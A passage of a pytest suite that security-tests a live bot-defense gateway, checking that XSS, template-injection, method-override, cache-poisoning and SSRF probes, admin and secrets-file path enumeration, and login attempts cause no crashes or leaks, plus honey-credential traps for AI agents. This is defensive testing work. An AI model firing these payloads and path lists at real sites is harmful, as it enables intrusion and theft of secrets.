        assert b"Traceback" not in body
        return status, body

    def test_p01_empty_object_no_500(self):
        self._post({})

    def test_p02_null_value_no_500(self):
        self._post({"RISK_BAN_THRESHOLD": None})

    def test_p03_array_value_no_500(self):
        self._post({"WHITELIST_PATHS": ["/ok", "/also-ok"]})

    def test_p04_very_long_string_no_500(self):
        self._post({"__testkey__": "X" * 50_000})

    def test_p05_xss_string_not_reflected(self):
        xss = "<script>alert('xss')</script>"
        status, body = self._post({"__xss__": xss})
        assert xss.encode() not in body, "XSS payload reflected in POST /config response"

    def test_p06_deeply_nested_object_no_500(self):
        self._post({"a": {"b": {"c": {"d": {"e": "deep"}}}}})

    def test_p07_boolean_values_no_500(self):
        self._post({"DEBUG": False, "ENABLE_RATE_LIMIT": True})

    def test_p08_numeric_threshold_no_500(self):
        self._post({"RISK_BAN_THRESHOLD": 999_999})

    def test_p09_json_injection_in_string_value(self):
        # Value that would break out of JSON context if improperly encoded
        self._post({"__k__": '"},"ADMIN_KEY":"leaked'})

    def test_p10_unicode_control_chars_no_500(self):
        self._post({"__k__": "\x00\x01\x1f\x7f"})


# ── Q: Reflected content / XSS probes ────────────────────────────────────────

@_skip_no_gw
class TestQReflectedContent:
    """Query params, path segments, and headers with XSS / template-injection
    payloads must not be reflected back or evaluated."""

    _XSS   = "<script>alert(1)</script>"
    _IMG   = "<img src=x onerror=alert(1)>"
    _SSTI  = ["{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}"]

    def _no_reflect(self, path, extra_headers=None):
        status, hdrs, body = _req(path, headers=extra_headers or {})
        assert status != 500
        assert self._XSS.encode() not in body, f"XSS reflected at {path!r}"
        assert self._IMG.encode() not in body, f"IMG XSS reflected at {path!r}"
        return status, body

    def test_q01_xss_in_query_param(self):
        self._no_reflect("/?" + urllib.parse.urlencode({"q": self._XSS}))

    def test_q02_xss_in_next_redirect_param(self):
        self._no_reflect(_NS + "/login?next=" + urllib.parse.quote(self._XSS))

    def test_q03_img_xss_in_path_segment(self):
        self._no_reflect("/" + urllib.parse.quote(self._IMG))

    def test_q04_xss_in_referer_header(self):
        self._no_reflect("/", extra_headers={"Referer": "https://evil.com/" + self._XSS})

    def test_q05_ssti_probes_not_evaluated(self):
        for payload in self._SSTI:
            status, hdrs, body = _req("/?" + urllib.parse.urlencode({"q": payload}))
            assert status != 500
            # If reflected, must not be evaluated (44+5=49 would indicate evaluation)
            if payload.encode() in body:
                assert b"49" not in body, f"Possible SSTI: {payload!r} evaluated"

    def test_q06_html_injection_in_error_path(self):
        status, hdrs, body = _req("/<h1>injected</h1>")
        assert b"<h1>injected</h1>" not in body, "Raw HTML reflected in response"

    def test_q07_json_injection_in_query(self):
        # Ensure query values don't escape into JSON responses
        status, hdrs, body = _req(_SNS + "/config?x=" + urllib.parse.quote('"},"key":"val'))
        assert b'"key":"val' not in body


# ── R: HTTP method override & verb tampering ──────────────────────────────────

@_skip_no_gw
class TestRMethodOverride:
    """Method-override headers and unusual HTTP verbs must not bypass routing
    or crash the gateway."""

    def _check(self, path, method, extra_headers=None, body=None):
        status, hdrs, resp = _req(path, method=method, headers=extra_headers, body=body)
        assert status != 500, f"{method} {path} returned 500"
        assert b"Traceback" not in resp
        return status, resp

    def test_r01_x_http_method_override_delete_on_login(self):
        self._check(_NS + "/login", "POST",
                    extra_headers={"X-HTTP-Method-Override": "DELETE"}, body=b"")

    def test_r02_x_http_method_override_put(self):
        self._check("/", "POST",
                    extra_headers={"X-HTTP-Method-Override": "PUT"}, body=b"data=x")

    def test_r03_method_param_override_in_body(self):
        # Rails-style _method=DELETE
        self._check("/", "POST",
                    extra_headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=b"_method=DELETE&data=x")

    def test_r04_connect_verb_no_500(self):
        self._check("/", "CONNECT")

    def test_r05_propfind_webdav_no_500(self):
        self._check("/", "PROPFIND")

    def test_r06_lock_webdav_no_500(self):
        self._check("/", "LOCK")

    def test_r07_post_to_secured_without_auth_no_leak(self):
        status, resp = self._check(_SNS + "/config", "POST",
                                    extra_headers={"Content-Type": "application/json"},
                                    body=b"{}")
        assert b"SESSION_KEY" not in resp and b"ADMIN_KEY" not in resp


# ── S: Cache-poisoning header probes ─────────────────────────────────────────

@_skip_no_gw
class TestSCachePoisoning:
    """Headers used in web-cache-poisoning attacks must not cause 500 or
    disclose internal routing information."""

    def _probe(self, headers, path=None):
        status, hdrs, body = _req(path or (_NS + "/login"), headers=headers)
        assert status != 500, f"500 with headers: {headers}"
        assert b"Traceback" not in body
        return status, hdrs, body

    def test_s01_x_forwarded_host(self):
        self._probe({"X-Forwarded-Host": "evil.attacker.com"})

    def test_s02_x_original_url_to_secured(self):
        _, _, body = self._probe({"X-Original-URL": _SNS + "/config"})
        assert b"ADMIN_KEY" not in body

    def test_s03_x_rewrite_url_to_secured(self):
        _, _, body = self._probe({"X-Rewrite-URL": _SNS + "/config"})
        assert b"ADMIN_KEY" not in body

    def test_s04_x_forwarded_scheme_downgrade(self):
        self._probe({"X-Forwarded-Scheme": "https", "X-Forwarded-Proto": "http"})

    def test_s05_x_forwarded_prefix(self):
        self._probe({"X-Forwarded-Prefix": _NS})

    def test_s06_x_host_ssrf_no_reflect(self):
        _, _, body = self._probe({"X-Host": "169.254.169.254"})
        assert b"169.254.169.254" not in body, "SSRF target reflected in response"

    def test_s07_forwarded_rfc7239_injection(self):
        self._probe({"Forwarded": 'for="[::1]";host=evil.com;proto=https'})

    def test_s08_cluster_client_ip_trust(self):
        # GCP / Nginx header — verify GW doesn't blindly trust it
        _, _, body = self._probe({"X-Cluster-Client-IP": "127.0.0.1"})
        assert b"Traceback" not in body


# ── T: Admin path enumeration ─────────────────────────────────────────────────

@_skip_no_gw
class TestTAdminEnumeration:
    """Common admin-path guesses must never produce 500 or leak secrets."""

    _GENERIC = [
        "/admin", "/admin/", "/administrator", "/manage", "/management",
        "/api/v1/admin", "/api/admin", "/internal", "/debug",
        "/actuator", "/actuator/env", "/actuator/beans",
        "/console", "/h2-console", "/_debug", "/__admin__",
        "/wp-admin", "/phpmyadmin",
    ]
    _GW_GUESSES = [
        "/config", "/metrics", "/bans", "/events",
        "/health", "/status", "/debug", "/version", "/info",
        "/reload", "/shutdown", "/restart",
    ]
    _SENSITIVE_FILES = [
        "/.env.bak", "/.env.local", "/.env.prod",
        "/config.yml", "/config.json", "/settings.py",
        "/app.py", "/proxy.py", "/docker-compose.yml", "/Dockerfile",
    ]

    def test_t01_generic_admin_paths_no_500(self):
        for path in self._GENERIC:
            status, hdrs, body = _req(path)
            assert status != 500, f"500 at {path!r}"
            assert b"Traceback" not in body, f"Traceback at {path!r}"

    def test_t02_gw_namespace_guesses_no_leak(self):
        for path in self._GW_GUESSES:
            status, hdrs, body = _req(_NS + path)
            assert status != 500, f"500 at {_NS+path!r}"
            assert b"SESSION_KEY" not in body

    def test_t03_sensitive_file_paths_no_secrets(self):
        for path in self._SENSITIVE_FILES:
            _, _, body = _req(path)
            assert b"ADMIN_KEY" not in body, f"ADMIN_KEY at {path!r}"
            assert b"SESSION_KEY" not in body, f"SESSION_KEY at {path!r}"


# ── U: Stateful ban accumulation ──────────────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set — ban list check needs auth")
class TestUBanAccumulation:
    """Fire bot-like requests with a unique UA fingerprint, then verify via the
    admin /bans and /events endpoints that the GW tracked the activity."""

    _SEED = secrets.token_hex(6)
    _UA   = f"BotProbe/{_SEED} sqlmap/1.0"

    def test_u01_bot_burst_no_500(self):
        for i in range(12):
            s, _, body = _req("/", headers={"User-Agent": self._UA})
            assert s != 500, f"500 on bot-UA burst request {i}"
            assert b"Traceback" not in body
            time.sleep(0.15)

    def test_u02_bans_endpoint_returns_parseable_response(self):
        # After a bot burst, this IP may be risk-accumulated — GW may serve a decoy
        # 404 instead of the real bans list. That's valid behaviour (ban system works).
        status, hdrs, body = _with_admin(_SNS + "/bans")
        assert status != 500, f"/bans returned 500 post-burst"
        assert b"Traceback" not in body
        if status == 200 and body.strip():
            try:
                data = json.loads(body)
                assert isinstance(data, (list, dict))
            except json.JSONDecodeError:
                pass

    def test_u03_events_endpoint_returns_parseable_response(self):
        # Same note as u02 — decoy 404 post-burst is acceptable evidence of ban logic.
        status, hdrs, body = _with_admin(_SNS + "/events")
        assert status != 500, f"/events returned 500 post-burst"
        assert b"Traceback" not in body
        if status == 200 and body.strip() and body.strip() not in (b"[]", b"{}"):
            try:
                data = json.loads(body)
                assert isinstance(data, (list, dict))
            except json.JSONDecodeError:
                pass

    def test_u04_metrics_contains_numeric_fields(self):
        status, hdrs, body = _with_admin(_SNS + "/metrics")
        assert status == 200
        if body.strip().startswith(b"{"):
            try:
                data = json.loads(body)
                nums = [v for v in data.values() if isinstance(v, (int, float))]
                assert nums, f"No numeric values in metrics; keys: {list(data.keys())}"
            except json.JSONDecodeError:
                pass


# ── V: Protocol-level edge cases ─────────────────────────────────────────────

@_skip_no_gw
class TestVProtocolEdgeCases:
    """Unusual but technically valid HTTP constructs — middleware must handle
    without crashing."""

    def test_v01_head_method_has_no_body(self):
        status, hdrs, body = _req(_NS + "/login", method="HEAD")
        assert status != 500
        assert not body, f"HEAD returned body: {body[:80]!r}"

    def test_v02_get_with_content_body_no_500(self):
        # RFC allows GET with body; most proxies strip it — must not crash
        status, hdrs, body = _req("/", method="GET",
                                   headers={"Content-Type": "application/json",
                                            "Content-Length": "2"},
                                   body=b"{}")
        assert status != 500

    def test_v03_post_without_content_type_no_500(self):
        status, hdrs, body = _req("/", method="POST",
                                   headers={"Content-Type": None},
                                   body=b"rawdata")
        assert status != 500

    def test_v04_accept_wildcard_on_login(self):
        status, hdrs, body = _req(_NS + "/login", headers={"Accept": "*/*"})
        assert status in (200, 301, 302)

    def test_v05_multiple_accept_encodings_no_500(self):
        status, hdrs, body = _req("/",
                                   headers={"Accept-Encoding": "br, zstd, gzip, deflate, identity"})
        assert status != 500

    def test_v06_if_none_match_no_500(self):
        status, hdrs, body = _req(_NS + "/login",
                                   headers={"If-None-Match": '"fake-etag-12345"'})
        assert status != 500

    def test_v07_range_header_no_500(self):
        status, hdrs, body = _req(_NS + "/login",
                                   headers={"Range": "bytes=0-1023"})
        assert status != 500

    def test_v08_very_deep_json_post_no_500(self):
        def _nest(d):
            return {"x": _nest(d - 1)} if d > 0 else "bottom"
        status, hdrs, body = _req("/", method="POST",
                                   headers={"Content-Type": "application/json"},
                                   body=json.dumps(_nest(20)).encode())
        assert status != 500

    def test_v09_duplicate_headers_no_500(self):
        # urllib merges dupe headers; verify the resulting request doesn't crash GW
        status, hdrs, body = _req(_NS + "/login",
                                   headers={"X-Custom-Dupe": "value1",
                                            "X-Custom-Dupe2": "value2"})
        assert status != 500


# ── W: Content-Type contract enforcement ─────────────────────────────────────

@_skip_no_gw
class TestWContentTypeContracts:
    """Every GW-owned endpoint must return the declared Content-Type for its content."""

    def _ct(self, path, cookie=None):
        hdrs = {"Cookie": cookie} if cookie else {}
        s, rh, b = _req(path, headers=hdrs)
        ct = (rh.get("Content-Type") or rh.get("content-type") or "").lower()
        return s, ct, b

    def test_w01_login_page_is_text_html(self):
        s, ct, _ = self._ct(_NS + "/login")
        assert s == 200
        assert "html" in ct, f"Login page Content-Type: {ct!r}"

    def test_w02_challenge_page_content_type_when_200(self):
        s, ct, b = self._ct(_NS + "/challenge")
        if s == 200 and b:
            assert "html" in ct or "text" in ct, f"Challenge CT: {ct!r}"

    def test_w03_js_challenge_is_html_or_js(self):
        s, ct, b = self._ct(_NS + "/js-challenge")
        if s == 200 and b:
            assert "html" in ct or "javascript" in ct or "text" in ct, \
                f"JS challenge CT: {ct!r}"

    @pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
    def test_w04_authenticated_config_is_json(self):
        sc = _admin_session_cookie().split(";")[0].strip()
        s, ct, _ = self._ct(_SNS + "/config", cookie=sc)
        assert s == 200
        assert "json" in ct, f"Authenticated config CT: {ct!r}"

    @pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
    def test_w05_authenticated_metrics_is_json(self):
        sc = _admin_session_cookie().split(";")[0].strip()
        s, ct, _ = self._ct(_SNS + "/metrics", cookie=sc)
        if s == 200:
            assert "json" in ct, f"Metrics CT: {ct!r}"

    @pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
    def test_w06_authenticated_bans_is_json(self):
        sc = _admin_session_cookie().split(";")[0].strip()
        s, ct, b = self._ct(_SNS + "/bans", cookie=sc)
        if s == 200 and b.strip() not in (b"", b"null"):
            assert "json" in ct, f"Bans CT: {ct!r}"

    @pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
    def test_w07_authenticated_events_is_json(self):
        sc = _admin_session_cookie().split(";")[0].strip()
        s, ct, b = self._ct(_SNS + "/events", cookie=sc)
        if s == 200 and b.strip() not in (b"", b"null"):
            assert "json" in ct, f"Events CT: {ct!r}"

    def test_w08_404_response_has_content_type(self):
        s, ct, b = self._ct("/definitely-not-here-" + secrets.token_hex(4))
        if b:
            assert ct, "Response with body has no Content-Type"


# ── X: Authentication flow correctness ───────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
class TestXAuthFlowCorrectness:
    """Verify authentication decisions are correct and access control actually works."""

    def _login_attempt(self, password):
        """POST to login; return (status_code, raw_Set-Cookie). Uses NoRedirect."""
        url = _BASE + _NS + "/login"
        body = urllib.parse.urlencode({"username": "admin", "password": password}).encode()
        hdrs = {"Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/124.0"}
        req_obj = urllib.request.Request(url, data=body, headers=hdrs, method="POST")
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_CTX), _NoRedirect())
        try:
            with opener.open(req_obj, timeout=15) as resp:
                return resp.status, resp.headers.get("Set-Cookie", "")
        except urllib.error.HTTPError as e:
            return e.code, e.headers.get("Set-Cookie", "")

    def test_x01_correct_login_issues_cookie(self):
        sc = _admin_session_cookie()  # uses cache — no extra login call
        assert sc and "=" in sc, "Correct login produced no Set-Cookie"

    def test_x02_session_cookie_has_required_security_flags(self):
        sc = _admin_session_cookie()
        assert "HttpOnly" in sc or "httponly" in sc.lower(), \
            f"Session cookie missing HttpOnly: {sc!r}"
        assert "SameSite" in sc or "samesite" in sc.lower(), \
            f"Session cookie missing SameSite: {sc!r}"
        if _BASE.startswith("https://"):
            assert "Secure" in sc or "secure" in sc.lower(), \
                f"Session cookie missing Secure on HTTPS: {sc!r}"

    def test_x03_wrong_password_grants_no_config_access(self):
        _, sc = self._login_attempt("WRONG_PASSWORD_XYZ_123!")
        if sc and "=" in sc:
            name_val = sc.split(";")[0].strip()
            s, _, b = _req(_SNS + "/config", headers={"Cookie": name_val})
            if s == 200:
                assert b"SESSION_KEY" not in b and b"ADMIN_KEY" not in b, \
                    "Wrong-password session granted config access!"

    def test_x04_empty_password_grants_no_config_access(self):
        _, sc = self._login_attempt("")
        if sc and "=" in sc:
            name_val = sc.split(";")[0].strip()
            s, _, b = _req(_SNS + "/config", headers={"Cookie": name_val})
            if s == 200:
                assert b"SESSION_KEY" not in b, \
                    "Empty-password session granted config access!"

    def test_x05_valid_session_returns_json_config(self):
        s, hdrs, b = _with_admin(_SNS + "/config")
        assert s == 200
        assert b.strip().startswith(b"{"), f"Config not JSON object: {b[:80]!r}"

    def test_x06_login_page_submits_locally(self):
        # Login uses JS fetch() — no traditional <form> tag.
        # Verify: password input present; any absolute fetch URL targets the same host.
        s, _, b = _req(_NS + "/login")
        assert s == 200
        bl = b.lower()
        has_pw = b'type="password"' in bl or b"type='password'" in bl or b'id="password"' in bl
        assert has_pw, "Login page has no password input element"
        base_host = urllib.parse.urlparse(_BASE).netloc.lower().encode()
        for m in re.finditer(rb"""fetch\([b'"](https?://[^'"]+)['"]\)""", bl):
            url = m.group(1)
            assert base_host in url, f"Login page fetches external URL: {url!r}"

    def test_x07_unauthenticated_config_exposes_no_real_settings(self):
        s, _, b = _req(_SNS + "/config")
        if s == 200 and b.strip().startswith(b"{"):
            try:
                data = json.loads(b)
                sensitive = {"ADMIN_KEY", "SESSION_KEY", "DB_PATH", "REDIS_URL"}
                exposed = sensitive & set(str(k) for k in _flatten_keys(data))
                assert not exposed, \
                    f"Unauthenticated /config exposed real settings: {exposed}"
            except json.JSONDecodeError:
                pass


# ── Y: Config API functional roundtrip ───────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
class TestYConfigFunctional:
    """Read/write consistency and schema validation for /config."""

    def test_y01_config_response_is_a_dict(self):
        s, _, b = _with_admin(_SNS + "/config")
        assert s == 200
        data = json.loads(b)
        assert isinstance(data, dict), f"Config is {type(data)}, expected dict"

    def test_y02_two_consecutive_reads_have_same_keys(self):
        _, _, b1 = _with_admin(_SNS + "/config")
        _, _, b2 = _with_admin(_SNS + "/config")
        k1 = set(json.loads(b1).keys())
        k2 = set(json.loads(b2).keys())
        assert k1 == k2, f"Config keys differ between reads: {k1} vs {k2}"

    def test_y03_noop_post_does_not_mutate_keys(self):
        _, _, b0 = _with_admin(_SNS + "/config")
        keys_before = set(json.loads(b0).keys())
        _with_admin(_SNS + "/config", method="POST",
                    body=json.dumps({}),
                    extra_headers={"Content-Type": "application/json"})
        _, _, b1 = _with_admin(_SNS + "/config")
        keys_after = set(json.loads(b1).keys())
        assert keys_before == keys_after, \
            f"Noop POST mutated config keys: {keys_before} → {keys_after}"

    def test_y04_auth_and_noauth_responses_differ(self):
        _, _, b_auth = _with_admin(_SNS + "/config")
        _, _, b_noauth = _req(_SNS + "/config")
        assert b_auth != b_noauth, \
            "Auth and unauth /config returned identical response — no access control?"

    def test_y05_config_structure_has_known_schema_keys(self):
        s, _, b = _with_admin(_SNS + "/config")
        assert s == 200
        data = json.loads(b)
        known = {"state", "vhost", "overridden", "vhosts",
                 "RISK_BAN_THRESHOLD", "WHITELIST_PATHS", "BLACKLIST_UAS"}
        found = known & set(str(k) for k in _flatten_keys(data))
        assert found, f"Config has no known schema keys; got: {list(data.keys())}"


# ── Z: Response body content verification ────────────────────────────────────

@_skip_no_gw
class TestZResponseBodyContent:
    """Verify actual HTML/JSON response bodies contain expected content and
    nothing they shouldn't."""

    def test_z01_login_page_has_password_input(self):
        s, _, b = _req(_NS + "/login")
        assert s == 200
        bl = b.lower()
        assert b'type="password"' in bl or b"type='password'" in bl, \
            "Login page missing <input type='password'>"

    def test_z02_login_page_submits_via_post_or_fetch(self):
        # Login page uses JS fetch() — no <form method=POST>.
        # Verify either a traditional method=POST OR a JS fetch/XHR is present.
        _, _, b = _req(_NS + "/login")
        bl = b.lower()
        has_form_post = (b'method="post"' in bl or b"method='post'" in bl
                         or b"method=post" in bl)
        has_js_submit = b"fetch(" in bl or b"xmlhttprequest" in bl
        assert has_form_post or has_js_submit, \
            "Login page has no POST form and no JS submission (fetch/XHR)"

    def test_z03_404_body_no_internal_file_paths(self):
        _, _, b = _req("/nonexistent-" + secrets.token_hex(4))
        assert b"/app/" not in b, "Internal /app/ path in 404 body"
        assert b'File "' not in b, "Python traceback path in 404 body"
        assert b"Traceback" not in b

    def test_z04_no_python_version_disclosure_in_error_bodies(self):
        for path in ["/wp-login.php", "/.env", "/nonexistent-xyz-abc"]:
            _, _, b = _req(path)
            assert not re.search(rb"Python/\d+\.\d+", b), \
                f"Python version disclosed in response at {path!r}"

    def test_z05_challenge_page_has_non_trivial_body(self):
        s, _, b = _req(_NS + "/challenge")
        if s == 200:
            assert len(b) > 20, f"Challenge body too short ({len(b)} bytes)"

    def test_z06_no_x_powered_by_python_or_aiohttp(self):
        for path in [_NS + "/login", "/"]:
            _, hdrs, _ = _req(path)
            xpb = (hdrs.get("X-Powered-By") or hdrs.get("x-powered-by") or "").lower()
            assert "python" not in xpb, f"X-Powered-By Python at {path!r}"
            assert "aiohttp" not in xpb, f"X-Powered-By aiohttp at {path!r}"

    def test_z07_unauthenticated_admin_endpoints_no_db_info(self):
        for ep in ["/config", "/metrics", "/db-test", "/bans"]:
            _, _, b = _req(_SNS + ep)
            assert b"postgresql://" not in b, f"DB URL in unauthenticated {ep}"
            bl = b.lower()
            assert not (b"sqlite" in bl and b"password" in bl), \
                f"Possible DB credentials at {ep}"


# ── AA: Live stateful behavior observation ────────────────────────────────────

@_skip_no_gw
@pytest.mark.skipif(not _KEY, reason="LIVE_GW_KEY not set")
class TestAALiveBehavior:
    """Stateful functional checks — observe what the GW actually tracked and decided."""

    def test_aa01_metrics_has_positive_counter_after_test_activity(self):
        """After running 160+ earlier tests, some metric counter must be > 0."""
        s, _, b = _with_admin(_SNS + "/metrics")
        assert s == 200
        try:
            data = json.loads(b)
            def _has_positive(obj):
                if isinstance(obj, dict):
                    return any(_has_positive(v) for v in obj.values())
                if isinstance(obj, list):
                    return any(_has_positive(v) for v in obj)
                return isinstance(obj, (int, float)) and obj > 0
            assert _has_positive(data), f"All metrics counters are zero: {data}"
        except json.JSONDecodeError:
            pytest.skip("Metrics response not JSON")

    def test_aa02_bans_list_is_parseable_structure(self):
        # 404 = decoy response when IP is risk-accumulated from earlier bot bursts — valid.
        s, _, b = _with_admin(_SNS + "/bans")
        assert s != 500, "/bans returned 500"
        assert b"Traceback" not in b
        if s == 200 and b.strip():
            data = json.loads(b)
            assert isinstance(data, (list, dict))

    def test_aa03_events_list_entries_are_dicts(self):
        # 404 = decoy when IP risk-accumulated — valid; ban system is working.
        s, _, b = _with_admin(_SNS + "/events")
        assert s != 500, "/events returned 500"
        assert b"Traceback" not in b
        if s == 200 and b.strip() and b.strip() not in (b"null", b"[]", b"{}"):
            data = json.loads(b)
            assert isinstance(data, (list, dict))
            if isinstance(data, list) and data:
                assert isinstance(data[0], dict), \
                    f"Event entry is not a dict: {type(data[0])}: {data[0]!r}"

    def test_aa04_all_admin_endpoints_no_500_with_valid_session(self):
        # Note: IP risk-accumulation from bot bursts may cause decoy 404 even with
        # a valid admin session (IP-ban takes precedence over session auth — documented
        # GW behaviour). Assert != 500, not == 200.
        sc = _admin_session_cookie().split(";")[0].strip()
        if not sc:
            pytest.skip("No admin session available")
        for ep in ["/config", "/metrics", "/bans", "/events", "/db-test"]:
            s, _, b = _req(_SNS + ep, headers={"Cookie": sc})
            assert s != 500, f"Admin {ep} returned 500 with valid session"
            assert b"Traceback" not in b

    def test_aa05_concurrent_login_page_requests_no_500(self):
        """Parallel requests to the login page must not trigger race-condition 500s."""
        import threading
        results = []
        lock = threading.Lock()
        def _fire():
            s, _, b = _req(_NS + "/login")
            with lock:
                results.append((s, b"Traceback" not in b))
        threads = [threading.Thread(target=_fire) for _ in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)
        assert len(results) == 4, "Not all concurrent requests completed"
        for s, no_tb in results:
            assert s != 500, f"Concurrent login-page request returned 500"
            assert no_tb, "Traceback in concurrent response"

    def test_aa06_db_test_with_auth_returns_dict(self):
        """db-test with auth must return a JSON dict (health check response)."""
        s, _, b = _with_admin(_SNS + "/db-test")
        assert s == 200
        assert b"Traceback" not in b
        try:
            data = json.loads(b)
            assert isinstance(data, dict), \
                f"db-test response is {type(data)}, expected dict"
        except json.JSONDecodeError:
            pass  # Challenge HTML if IP is risk-accumulated


@_skip_no_gw
class TestABHoneyCred:
    """Honey credential injection — P1 AI-agent detector."""

    def test_ab01_probe_endpoint_reachable(self):
        """GET /probe must be publicly accessible (no auth, no decoy)."""
        s, _, b = _req(_NS + "/probe")
        assert s != 500, f"Probe endpoint 500: {b[:200]!r}"
        assert b"Traceback" not in b

    def test_ab02_probe_with_invalid_key_returns_non_500(self):
        """Probe with a bogus key must not crash the GW."""
        s, _, b = _req(_NS + "/probe?k=deadbeef00000000deadbeef00000000")
        assert s != 500, f"Probe with bogus key returned 500: {b[:200]!r}"

    def test_ab03_probe_with_empty_key_returns_non_500(self):
        """Probe with empty k param must not crash."""
        s, _, b = _req(_NS + "/probe?k=")
        assert s != 500

    def test_ab04_probe_no_key_param_returns_non_500(self):
        """Probe with no k param must not crash."""
        s, _, b = _req(_NS + "/probe")
        assert s != 500

    def test_ab05_login_page_injects_honey_comment(self):
        """Login HTML must contain a honey-cred comment block (if enabled)."""
        s, hdrs, b = _req(_NS + "/login")
        if s != 200:
            pytest.skip("Login page not 200 (IP risk-accumulated)")
        ct = hdrs.get("Content-Type", "") or hdrs.get("content-type", "")
        if "text/html" not in ct:
            pytest.skip("Not HTML response")
        # Honey cred injection places API-key-shaped values in HTML comments
        has_comment = b"<!--" in b
        has_probe = b"/probe" in b
        assert has_comment or has_probe, \
            "Login page has no HTML comment or /probe link — honey-cred may be disabled"


@_skip_no_gw
class TestACCanaryProbe:
    """Browser canary probe — P4 AI-agent detector."""

    def test_ac01_canary_probe_endpoint_reachable(self):
        """GET /canary-probe/<token> must not 500."""
        s, _, b = _req(_NS + "/canary-probe/deadbeef00000000")
        assert s != 500, f"Canary probe 500: {b[:200]!r}"

    def test_ac02_canary_probe_with_garbage_token_non_500(self):
        """Garbage token must be handled gracefully."""
        s, _, b = _req(_NS + "/canary-probe/!!invalid!!")
        assert s != 500

    def test_ac03_canary_probe_returns_valid_content_type(self):
        """Canary probe must return a recognisable content type."""
        s, hdrs, _ = _req(_NS + "/canary-probe/0000000000000000")
        ct = hdrs.get("Content-Type", "") or hdrs.get("content-type", "")
        assert ct, "No Content-Type on canary-probe response"
        assert s != 500

    def test_ac04_canary_probe_no_cache(self):
        """Canary probe must not be cacheable (prevents pre-fetch poisoning)."""
        s, hdrs, _ = _req(_NS + "/canary-probe/0000000000000000")
        cc = hdrs.get("Cache-Control", "") or hdrs.get("cache-control", "")
        if s in (200, 204):
            assert "no-store" in cc or "no-cache" in cc or "private" in cc, \
                f"Canary probe cacheable: Cache-Control={cc!r}"


@_skip_no_gw
class TestADHoneyCredMaze:
    """Verify redirect maze endpoint is gone (feature removed)."""

    def test_ad01_maze_endpoint_removed(self):
        """/maze must not be a live routed endpoint anymore."""
        s, _, b = _req(_NS + "/maze")
        # Removed feature: expect 404 (decoy), not a 302 redirect with t= token
        has_maze_token = b"?t=" in b and b"/maze" in b
        assert not has_maze_token, \
            "Maze redirect is still active — feature should be removed"

    def test_ad02_maze_with_token_not_redirect_loop(self):
        """/maze?t=bogus&d=/ must not loop — expect non-302 or 302 to dest only."""
        s, hdrs, _ = _req(_NS + "/maze?t=bogus.0.deaddead&d=%2F")
        if s == 302:
            loc = hdrs.get("Location", "") or hdrs.get("location", "")
            assert "/maze" not in loc, \
                f"Maze still redirecting to itself: Location={loc!r}"


@_skip_no_gw
class TestAEDefenseThresholds:
    """Defense threshold slider — validates live config read/write."""

    def test_ae01_config_contains_soft_and_ban_thresholds(self):
        """Config must expose SOFT_CHALLENGE_SCORE and RISK_BAN_THRESHOLD."""
        s, _, b = _with_admin(_SNS + "/config")
        if s != 200:
            pytest.skip(f"Config endpoint {s}")
        try:
            data = json.loads(b)
        except json.JSONDecodeError:
            pytest.skip("Non-JSON config response")
        cfg = data.get("state", data)
        assert "SOFT_CHALLENGE_SCORE" in cfg or "state" in data, \
            "SOFT_CHALLENGE_SCORE not in config"
        assert "RISK_BAN_THRESHOLD" in cfg or "state" in data, \
            "RISK_BAN_THRESHOLD not in config"

    def test_ae02_soft_score_is_numeric(self):
        """SOFT_CHALLENGE_SCORE must be a number."""
        s, _, b = _with_admin(_SNS + "/config")
        if s != 200:
            pytest.skip(f"Config {s}")
        try:
            cfg = json.loads(b)
            val = cfg.get("state", cfg).get("SOFT_CHALLENGE_SCORE")
        except (json.JSONDecodeError, AttributeError):
            pytest.skip("Non-JSON or unexpected structure")
        if val is not None:
            assert isinstance(val, (int, float)), \
                f"SOFT_CHALLENGE_SCORE is {type(val)}, expected number"

    def test_ae03_ban_threshold_is_numeric(self):
        """RISK_BAN_THRESHOLD must be a number."""
        s, _, b = _with_admin(_SNS + "/config")
        if s != 200:
            pytest.skip(f"Config {s}")
        try:
            cfg = json.loads(b)
            val = cfg.get("state", cfg).get("RISK_BAN_THRESHOLD")
        except (json.JSONDecodeError, AttributeError):
            pytest.skip("Non-JSON or unexpected structure")
        if val is not None:
            assert isinstance(val, (int, float)), \
                f"RISK_BAN_THRESHOLD is {type(val)}, expected number"

    def test_ae04_write_soft_score_above_100_accepted(self):
        """SOFT_CHALLENGE_SCORE must accept values > 100 (no hard max)."""
        s, _, b = _with_admin(_SNS + "/config", method="POST",
                              body=b'{"SOFT_CHALLENGE_SCORE": 150}',
                              extra_headers={"Content-Type": "application/json"})
        assert s != 500, f"POST config 500: {b[:200]!r}"
        if s == 200:
            try:
                resp = json.loads(b)
                assert resp.get("applied") or "rejected" in resp, \
                    "Config POST returned 200 but neither applied nor rejected"
                assert "SOFT_CHALLENGE_SCORE" not in (resp.get("rejected") or {}), \
                    "SOFT_CHALLENGE_SCORE > 100 was rejected — hard limit still present"
            except json.JSONDecodeError:
                pass
        # Restore to default
        _with_admin(_SNS + "/config", method="POST",
                    body=b'{"SOFT_CHALLENGE_SCORE": 4}',
                    extra_headers={"Content-Type": "application/json"})

    def test_ae05_write_ban_threshold_above_100_accepted(self):
        """RISK_BAN_THRESHOLD must accept values > 100 (no hard max)."""
        s, _, b = _with_admin(_SNS + "/config", method="POST",
                              body=b'{"RISK_BAN_THRESHOLD": 200}',
                              extra_headers={"Content-Type": "application/json"})
        assert s != 500, f"POST config 500: {b[:200]!r}"
        if s == 200:
            try:
                resp = json.loads(b)
                assert "RISK_BAN_THRESHOLD" not in (resp.get("rejected") or {}), \
                    "RISK_BAN_THRESHOLD > 100 was rejected — hard limit still present"
            except json.JSONDecodeError:
                pass
